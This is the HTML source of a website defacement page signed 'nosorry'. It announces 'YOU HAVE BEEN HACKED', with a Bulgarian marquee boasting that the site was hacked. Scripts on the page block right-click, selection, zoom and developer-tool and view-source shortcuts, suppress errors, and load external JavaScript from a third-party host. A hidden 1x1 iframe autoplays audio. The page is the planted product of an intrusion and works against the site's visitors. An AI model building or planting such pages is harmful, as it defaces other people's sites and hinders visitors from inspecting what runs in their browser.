<html><head>

<title>Hacked by nosorry </title>
<meta name="description" content="[ 🖕 ]">



<script>
var pesen="🖕";
function clickIE4(){if (event.button==2){alert(pesen);return false;}}
function clickNS4(e){if (document.layers||document.getElementById&&!document.all){if (e.which==2||e.which==3){alert(pesen);return false;}}}
if (document.layers){document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS4;}
else if (document.all&&!document.getElementById){document.onmousedown=clickIE4;}
document.oncontextmenu=new Function("alert(pesen);return false")
</script>
<script type="text/javascript">
        window.oncontextmenu = function () {
            return false;
        }
        $(document).keydown(function (event) {
            if (event.keyCode == 123) {
                return false;
            }
            else if ((event.ctrlKey && event.shiftKey && event.keyCode == 73) || (event.ctrlKey && event.shiftKey && event.keyCode == 74)) {
                return false;
            }
        });
    </script>
	<script>
	document.onkeydown = function(e) { 
        if (e.ctrlKey && 
            (e.keyCode === 85 )) {
            return false;
        }
	};
	</script>
	<script>
	document.addEventListener("keydown", function(e) {
	if (e.keyCode == 83 && (navigator.platform.match("Mac") ? e.metaKey : e.ctrlKey)) {
    e.preventDefault();
    alert('🖕');
	}
	}, false);
	</script>
	<script>
	   jQuery(function($) {
	   
	   var index = 'qpsstats-active-tab';
	   var dataStore = window.sessionStorage;
	   var oldIndex = 0;
	   
	   var tabs = $('.about_tabs');
	   var tabs_select = true;
	   var selector = $(".about_tabs").find(".slide__tdc");
	   var activeItem = tabs.find('.about_tabs li .ui-state-active');
	   var activeWidth = activeItem.innerWidth();
	   
	   $(".slide__tdc").css({
	     "left": activeItem.position.left + "px", 
	     "width": activeWidth + "px"
	   });



	       
	   try {
	       oldIndex = dataStore.getItem(index);
	       $('#tdc_slide').addClass('animated fadeInLeft tabs' + oldIndex);
	       $('#tdc_slide').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function() {
	           $(this).removeClass('animated fadeInLeft');
	       });
	   } catch (e) {}


	   $("#tabs").tabs({
	       active: oldIndex,
	       hide: {
	           effect: "fade",
	           duration: 200
	       },
	       show: { 
	           function( event, ui ) {

	           alert('2');
	           },
	           effect: "fade",
	           direction: "right",
	           duration: 200
	       }, 
	       activate: function(event, ui) {
				   tabs_select = false;
					
				   var newIndex = ui.newTab.parent().children().index(ui.newTab);
				
				   $('#tdc_slide').removeClass();
				   $('#tdc_slide').addClass('animated fadeInLeft tabs' + newIndex);
				   $('#tdc_slide').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function() {
					   $(this).removeClass('animated fadeInLeft');  
				 });
					var isn = $('.ui-tabs-active');
					var activeWidth = isn.innerWidth();
					var itemPos = isn.position();
						 $(".slide__tdc").css({
						   "left":itemPos.left + "px", 
						   "width": activeWidth + "px"
					});
	           
			   
	           try {
	               dataStore.setItem(index, newIndex);
	           } catch (e) {}
				tabs_select = true;
	       }
	   })
	   
	   	   
/* 	   $(".about_tabs").on("click","li",function(e){
		if (tabs_select == true) {
		 e.preventDefault();
	     var activeWidth = $(this).innerWidth();
	     var itemPos = $(this).position();
	     $(".slide__tdc").css({
	       "left":itemPos.left + "px", 
	       "width": activeWidth + "px"
	     });
			
		}
	   });
	        */
	   
	   
			window.onload = function() {
			var elm = $(".revealator-slideright");
			elm.css('transform','translate(0, 0)').css('opacity', '1').css('z-index', '1');
			};
				   
			
	    	function slider_tabs() {
	        var elm = $(".ui-state-active");
	        var activeWidth = elm.innerWidth();
	        var itemPos = elm.position();
	        $(".slide__tdc").css({
			"left":itemPos.left + "px", 
			"width": activeWidth + "px"
			});
			}
			window.onresize = function(event) {
			slider_tabs();
		    };
			
			
			slider_tabs();
	})
	</script>
	<script>
	$(document).keydown(function(event) {
	if (event.ctrlKey==true && (event.which == '61' || event.which == '107' || event.which == '173' || event.which == '109'  || event.which == '187'  || event.which == '189'  ) ) {
        event.preventDefault();
     }
    // 107 Num Key  +
    // 109 Num Key  -
    // 173 Min Key  hyphen/underscor Hey
    // 61 Plus key  +/= key
	});

	$(window).bind('mousewheel DOMMouseScroll', function (event) {
       if (event.ctrlKey == true) {
       event.preventDefault();
       }
		});
</script>
	</head>
	<script>
		function disableselect(e) {
		  return false
		}

		function reEnable() {
		  return true
		}

		document.onselectstart = new Function ("return false")

		if (window.sidebar) {
		  document.onmousedown = disableselect
		  document.onclick = reEnable
		}
		</script>
		<script>
		$(document).ready(function(){
	 var keyCodes = [61, 107, 173, 109, 187, 189];

	 $(document).keydown(function(event) {   
	   if (event.ctrlKey==true && (keyCodes.indexOf(event.which) != -1)) {
		 alert('Това няма да помогне.'); 
		 event.preventDefault();
		}
	 });

	 $(window).bind('mousewheel DOMMouseScroll', function (event) {
		if (event.ctrlKey == true) {
		  alert('Nah.'); 
		  event.preventDefault();
		}
	  });
	});
	</script>
<script language="javascript"src="http://ykubnay.yn.lt/Js/salju/teal.js"type="text/javascript">
<span style="color: #FFFF00">YELLOW SNOW</span>
<br />
<textarea cols="8"rows="2">
<script language="javascript"src="http://ykubnay.yn.lt/Js/salju/yellow.js"></script>
<style type='text/css'>body, a:hover {cursor: url(http://cur.cursors-4u.net/cursors/cur-2/cur118.cur), progress;}</style><a href='http://www.cursors-4u.com/cursor/2008/12/17/cool-grey-outer-glow-pointer.html' target='_blank' title='Cool Grey Outer Glow Pointer'><img alt='Cool Grey Outer Glow Pointer' border='0' src='http://cur.cursors-4u.net/cursor.png' style='position:absolute; top: 0px; right: 0px;'/></a>
	<style><!--#spinner,.face.back,h1{text-align:center}body{background:#000;font-family:Tahoma,Verdana,sans-serif}.type1,.type2,h1{font-family:Orbitron}h1{color:#333;font-size:50px;margin:1px;text-transform:uppercase}.red,.type1{font-size:21px}#spinner{animation-name:spinner;animation-timing-function:linear;animation-iteration-count:infinite;animation-duration:7s;transform-style:preserve-3d}@keyframes spinner{from{transform:rotateY(0)}to{transform:rotateY(-360deg)}}.face{position:absolute;width:100%;height:100%;backface-visibility:hidden}#div1,h2 span{position:relative}.face.back{display:block;transform:rotateY(180deg);box-sizing:border-box;color:#fff}#div1{left:-66px;top:140px;height:250px;width:100px;-webkit-perspective:150px;perspective:150px}#div2{height:1px;width:150px;padding:50px;border:1px solid #000;border-radius:20px;background-color:rgba(255,255,255,.11);-webkit-transform:rotateX(45deg);transform:rotateX(45deg)}h2 span{top:-60px}.red{color:#FF5E5E;text-shadow:0 0 15px #FF5E5E;text-shadow:0 0 15px #fff;-webkit-transition:width .5s;-webkit-animation:loading 5s ease-out infinite}@-webkit-keyframes loading{0%,100%{opacity:.2}50%{opacity:1}}.type1{color:#3c3}.type2{color:#999;font-size:20px}.kcf{color:#FFF;text-shadow:0 0 5px #0f0,0 0 10px #0f0,0 0 30px #000,0 0 45px #000,0 0 60px #000}<script language="JavaScript1.2">function ClearError(){return!0}window.onerror=ClearError;--></script></style><script>window.onload=function(){var n,e=document.getElementsByTagName("h1")[0],a=e.innerText||e.textContent,t=[],l=0,o=null;for(n=0;n<a.length;++n)t.push("<span>"+a[n]+"</span>");e.innerHTML=t.join(""),t=e.childNodes;var r=function(){for(l+=.01,l>=1&&clearInterval(o),n=0;n<t.length;++n)Math.random()<l?t[n].className="kcf":t[n].className=""};setInterval(r,100)};</script>
<style>
*{
	margin-top:2px;
}

body{
    background-position: center;
	background-color:#000000;
 
    background-attachment: fixed;
    background-size:5px;
	background-image:url(http://i.imgur.com/rHHZqbog.jpg);
	}

</style></head>
<br><br><br><br><br><br><br><br><br><br>
<center><style></script></style><h1>YOU  HAVE  BEEN  HACKED</h1>
<br><br>
<center><div id="foter" class="foter" style="position: center; width: 600px; height: 28px; margin: 0px; padding: 10px; font-size: 24px; text-align: center; color: rgb(255, 255, 255); font-family: &quot;trebuchet ms&quot;, Courier new, courier new, sans-serif; transform: transform-origin: 50% 0px 0px; background-color: rgb(0, 0, 0); border: 1px solid rgb(170, 170, 170); opacity: 0.5; ">
<font face="courier new"><marquee color="lime" behavior="Flip" scrollamount="6" width="85%" style="width: 50%;">Този сайт беше хакнат успешно, натегнах те, уссс </marquee></font></div></span><br><br><br>
    <img src="https://onlypult.com/blog_uploads/1510825664-3f46e7d3d2bc2db8bc838e32f7a6211d.png" draggable="false" width="250"/><br>
<div style="position: fixed; top: 75px; left: -225px; width: 600px; padding: 10px; font-size: 24px; text-align: center; color: white; font-family: 'trebuchet ms', verdana, arial, sans-serif;transform: rotate(-45deg);transform-origin: 50% 0px;-o-transform: rotate(-45deg); -o-transform-origin: 50% 0px;-moz-transform: rotate(-45deg); -moz-transform-origin: 50% 0px; -webkit-transform: rotate(-45deg); -webkit-transform-origin: 50% 0px; background-color: Transparent; border: 1px solid rgb(170, 170, 170); z-index: 9999; opacity: 0.5;"><a style="text-decoration:none;color:white;">nosorry </a></div>
 <iframe width="1" height="1" src="https://www.youtube.com/embed/QrTQly54vWI?rel=0&autoplay=1" frameborder="0" allowfullscreen></iframe>
<script>
document.onkeydown = function(e) {
// keycode for F11 function
if (e.keyCode === 122) {
  return false;
}
// keycode for F12 function
if (e.keyCode === 123) {
// try to cancel the backspace
  return false;
}
};
</script>
<script>
document.onkeydown = function(e) {
        if (e.ctrlKey && 
            (e.keyCode === 85 )) {
            return false;
        }
};
</script>
<script>
	$( document ).ready(function() {
	for (let lnk of document.getElementsByClassName('link')) { lnk.setAttribute('draggable', false) }
    });
	</script>
</center
</font></body></html>
